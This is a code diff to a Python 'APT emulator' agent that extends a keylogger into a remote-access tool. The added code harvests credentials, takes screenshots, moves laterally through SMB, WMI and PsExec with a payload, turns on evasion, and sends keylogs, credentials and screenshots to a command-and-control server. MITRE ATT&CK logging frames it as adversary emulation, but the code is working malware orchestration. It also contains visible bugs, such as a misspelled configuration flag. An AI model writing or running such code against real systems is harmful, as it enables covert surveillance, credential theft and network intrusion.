@@ -4,18 +4,25 @@ import os
 import time
 import json
 import sys
+import threading
 from datetime import datetime
 from pynput.keyboard import Listener, Key
 
 # Import configuration
 from config import (
     TRANSMISSION_INTERVAL, LOG_FILE, BELIEVABLE_FILES, 
-    SILENT_MODE, DEBUG_MODE
+    SILENT_MODE, DEBUG_MODE, CREDENTIAL_HARVEST_ENABLED,
+    SCREEN_CAPTURE_ENABLED, LATERAL_MOVEMENT_ENABLED,
+    EVASION_ENABLED, PLUGIN_SYSTEM_ENABLED, MITRE_LOGGING_ENABLED,
+    CAMPAIGN_MODE_ENABLED
 )
 
 # Import core modules
 from core import (
-    stealth_manager, c2_client, persistence_manager, recon_manager
+    stealth_manager, c2_client, persistence_manager, recon_manager,
+    credential_harvester, screen_capture, lateral_movement,
+    evasion_manager, plugin_manager, mitre_logger,
+    reporting_manager, campaign_orchestrator
 )
 
 class APTEmulator:
@@ -25,6 +32,10 @@ class APTEmulator:
         self.session_data = {}
         self.keylog_buffer = []
         self.is_running = True
+        self.screenshot_buffer = []
+        self.credential_buffer = []
+        # Get session ID from C2 client
+        self.session_id = c2_client.session_id
         
     def initialize(self):
         """Initialize the APT emulation system"""
@@ -40,6 +51,10 @@ class APTEmulator:
                     print("Analysis environment detected, aborting execution")
                 return False
             
+            # Initialize evasion if enabled
+            if EVASION_ENABLED:
+                evasion_manager.initialize_evasion()
+            
             # Perform initial system reconnaissance
             self.session_data = recon_manager.get_comprehensive_info()
             
@@ -51,8 +66,19 @@ class APTEmulator:
                 if DEBUG_MODE:
                     print("Persistence mechanisms installed")
             
+            # Load plugins if enabled
+            if PLUGIN_SYSTEM_ENABLED:
+                self._initialize_plugins()
+            
             # Send initial heartbeat to C2
             c2_client.heartbeat(self.session_data.get('basic', {}))
+            
+            # Log MITRE technique
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1082', True, {
+                    'method': 'comprehensive_discovery',
+                    'info_categories': len(self.session_data)
+                })
             
             return True
             
@@ -62,6 +88,24 @@ class APTEmulator:
                     lambda: print(f"Initialization failed: {e}")
                 )
             return False
+    
+    def _initialize_plugins(self):
+        """Initialize plugin system"""
+        try:
+            plugin_manager.load_all_plugins()
+            if DEBUG_MODE:
+                print(f"Loaded {len(plugin_manager.get_all_plugins())} plugins")
+            
+            # Trigger startup hooks
+            plugin_manager.trigger_global_hook('on_startup', {
+                'timestamp': datetime.now().isoformat()
+            })
+            
+        except Exception as e:
+            if DEBUG_MODE:
+                stealth_manager.safe_execute(
+                    lambda: print(f"Plugin initialization failed: {e}")
+                )
     
     def _log_session_data(self):
         """Log session data to file"""
@@ -186,11 +230,10 @@ class APTEmulator:
                         lambda: print(f"Keylog file write failed: {e}")
                     )
             
-            # Send to C2 server
+            # Send to C2 server - format matches /api/agent/keylog/route.ts
             keylog_data = {
-                'type': 'keylog',
-                'timestamp': datetime.now().isoformat(),
-                'data': self.keylog_buffer.copy()
+                'keyData': json.dumps(self.keylog_buffer.copy()),
+                'timestamp': datetime.now().isoformat()
             }
             
             c2_client.send_data(keylog_data, endpoint="/keylog")
@@ -198,11 +241,103 @@ class APTEmulator:
             # Clear buffer
             self.keylog_buffer.clear()
             
+            # Log MITRE technique
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1056.001', True, {
+                    'keys_logged': len(self.keylog_buffer)
+                })
+            
         except Exception as e:
             if DEBUG_MODE:
                 stealth_manager.safe_execute(
                     lambda: print(f"Keylog buffer flush failed: {e}")
                 )
+    
+    def harvest_credentials(self):
+        """Harvest credentials from the system"""
+        if not CREDENTIAL_HARVEST_ENABLED:
+            return None
+        
+        try:
+            credentials = credential_harvester.harvest_all_credentials()
+            self.credential_buffer.extend(credentials.get('credentials', []))
+            
+            # Send to C2 - format matches /api/agent/credentials/route.ts
+            if credentials.get('credentials'):
+                cred_data = {
+                    'credentials': credentials.get('credentials'),
+                    'timestamp': datetime.now().isoformat()
+                }
+                c2_client.send_data(cred_data, endpoint="/credentials")
+            
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1555', True, {
+                    'credentials_found': len(credentials.get('credentials', []))
+                })
+            
+            return credentials
+            
+        except Exception as e:
+            if DEBUG_MODE:
+                stealth_manager.safe_execute(
+                    lambda: print(f"Credential harvesting failed: {e}")
+                )
+            return None
+    
+    def take_screenshot(self):
+        """Capture a screenshot"""
+        if not SCREEN_CAPTURE_ENABLED:
+            return None
+        
+        try:
+            screenshot = screen_capture.take_screenshot()
+            
+            if screenshot and screenshot.get('image_data'):
+                self.screenshot_buffer.append(screenshot)
+                
+                # Send to C2 - format matches /api/agent/screenshot/route.ts
+                screenshot_data = {
+                    'filename': screenshot.get('filename', f'screenshot_{int(time.time())}.png'),
+                    'fileSize': screenshot.get('file_size', 0),
+                    'mimeType': 'image/png',
+                    'fileHash': screenshot.get('hash')
+                }
+                c2_client.send_data(screenshot_data, endpoint="/screenshot")
+            
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1113', True, screenshot.get('dimensions'))
+            
+            return screenshot
+            
+        except Exception as e:
+            if DEBUG_MODE:
+                stealth_manager.safe_execute(
+                    lambda: print(f"Screenshot capture failed: {e}")
+                )
+            return None
+    
+    def discover_network_targets(self):
+        """Discover network targets for lateral movement"""
+        if not LATERAL_MOVEMENT_ENABLED:
+            return None
+        
+        try:
+            targets = lateral_movement.discover_network_targets()
+            
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1018', True, {
+                    'hosts_found': len(targets.get('hosts', [])),
+                    'shares_found': len(targets.get('shares', []))
+                })
+            
+            return targets
+            
+        except Exception as e:
+            if DEBUG_MODE:
+                stealth_manager.safe_execute(
+                    lambda: print(f"Network discovery failed: {e}")
+                )
+            return None
     
     def start_c2_communication_loop(self):
         """Start the main C2 communication loop"""
@@ -268,6 +403,37 @@ class APTEmulator:
                     if cmd:
                         self._execute_system_command(cmd)
                 
+                elif cmd_type == 'harvest_credentials':
+                    if CREDITAL_HARVEST_ENABLED:
+                        credentials = self.harvest_credentials()
+                        c2_client.send_data(credentials, endpoint="/credentials")
+                
+                elif cmd_type == 'take_screenshot':
+                    if SCREEN_CAPTURE_ENABLED:
+                        screenshot = self.take_screenshot()
+                        c2_client.send_data(screenshot, endpoint="/screenshot")
+                
+                elif cmd_type == 'discover_targets':
+                    if LATERAL_MOVEMENT_ENABLED:
+                        targets = self.discover_network_targets()
+                        c2_client.send_data(targets, endpoint="/targets")
+                
+                elif cmd_type == 'lateral_move':
+                    if LATERAL_MOVEMENT_ENABLED:
+                        target = command.get('target', '')
+                        method = command.get('method', 'smb')
+                        result = self._execute_lateral_movement(target, method)
+                        c2_client.send_data(result, endpoint="/lateral_result")
+                
+                elif cmd_type == 'generate_report':
+                    report = reporting_manager.generate_session_report(self.session_data)
+                    c2_client.send_data(report, endpoint="/report")
+                
+                elif cmd_type == 'start_campaign':
+                    if CAMPAIGN_MODE_ENABLED:
+                        campaign_type = command.get('campaign_type', 'full')
+                        self._execute_campaign(campaign_type)
+                
                 elif cmd_type == 'shutdown':
                     self.shutdown()
                 
@@ -277,6 +443,13 @@ class APTEmulator:
                 else:
                     if DEBUG_MODE:
                         print(f"Unknown command type: {cmd_type}")
+                        
+                # Trigger plugin hooks
+                if PLUGIN_SYSTEM_ENABLED:
+                    plugin_manager.trigger_global_hook('on_command', {
+                        'command_type': cmd_type,
+                        'command_data': command
+                    })
                         
         except Exception as e:
             if DEBUG_MODE:
@@ -309,6 +482,12 @@ class APTEmulator:
             
             c2_client.send_data(command_result, endpoint="/command_result")
             
+            # Log MITRE technique
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1059.003', result.returncode == 0, {
+                    'command': command
+                })
+            
         except Exception as e:
             error_result = {
                 'type': 'command_error',
@@ -318,6 +497,69 @@ class APTEmulator:
             }
             
             c2_client.send_data(error_result, endpoint="/command_result")
+    
+    def _execute_lateral_movement(self, target, method='smb'):
+        """Execute lateral movement to target"""
+        try:
+            if method == 'smb':
+                result = lateral_movement.move_via_smb(
+                    target, 'C$', 'payload.exe'
+                )
+            elif method == 'wmi':
+                result = lateral_movement.move_via_wmi(target, 'payload.exe')
+            elif method == 'psexec':
+                result = lateral_movement.move_via_psexec(target, 'payload.exe')
+            else:
+                result = {'success': False, 'error': 'Unknown method'}
+            
+            # Log MITRE technique
+            if MITRE_LOGGING_ENABLED:
+                mitre_logger.log_technique('T1021.002', result.get('success', False), {
+                    'target': target,
+                    'method': method
+                })
+            
+            return result
+            
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
+    def _execute_campaign(self, campaign_type):
+        """Execute a predefined campaign"""
+        try:
+            # Create campaign orchestrator
+            orchestrator = campaign_orchestrator
+            
+            if campaign_type == 'initial_access':
+                campaign_orchestrator = campaign_orchestrator.__class__(
+                    f"campaign_initial_{int(time.time())}"
+                )
+                from core.campaign import CampaignTemplates
+                CampaignTemplates.create_initial_access_campaign(campaign_orchestrator)
+            elif campaign_type == 'credential_theft':
+                from core.campaign import CampaignTemplates
+                CampaignTemplates.create_credential_theft_campaign(campaign_orchestrator)
+            elif campaign_type == 'lateral_movement':
+                from core.campaign import CampaignTemplates
+                CampaignTemplates.create_lateral_movement_campaign(campaign_orchestrator)
+            elif campaign_type == 'full':
+                from core.campaign import CampaignTemplates
+                CampaignTemplates.create_full_assessment_campaign(campaign_orchestrator)
+            
+            # Execute campaign
+            results = campaign_orchestrator.execute_campaign()
+            
+            # Send results to C2
+            c2_client.send_data(results, endpoint="/campaign_results")
+            
+            return results
+            
+        except Exception as e:
+            if DEBUG_MODE:
+                stealth_manager.safe_execute(
+                    lambda: print(f"Campaign execution failed: {e}")
+                )
+            return {'error': str(e)}
     
     def run_campaign(self):
         """Run the complete APT campaign"""
@@ -363,6 +605,28 @@ class APTEmulator:
             # Flush any remaining keylog data
             if self.keylog_buffer:
                 self._flush_keylog_buffer()
+            
+            # Trigger plugin shutdown hooks
+            if PLUGIN_SYSTEM_ENABLED:
+                plugin_manager.trigger_global_hook('on_shutdown', {
+                    'timestamp': datetime.now().isoformat()
+                })
+                plugin_manager.shutdown_all_plugins()
+            
+            # Stop evasion
+            if EVASION_ENABLED:
+                evasion_manager.evasion_active = False
+            
+            # Stop screen streaming
+            if SCREEN_CAPTURE_ENABLED:
+                screen_capture.stop_screen_stream()
+            
+            # Generate final report
+            if MITRE_LOGGING_ENABLED:
+                report = reporting_manager.generate_session_report(self.session_data)
+                mitre_logger.log_technique('T1070', True, {
+                    'report_generated': True
+                })
             
             # Send final status to C2
             shutdown_data = {
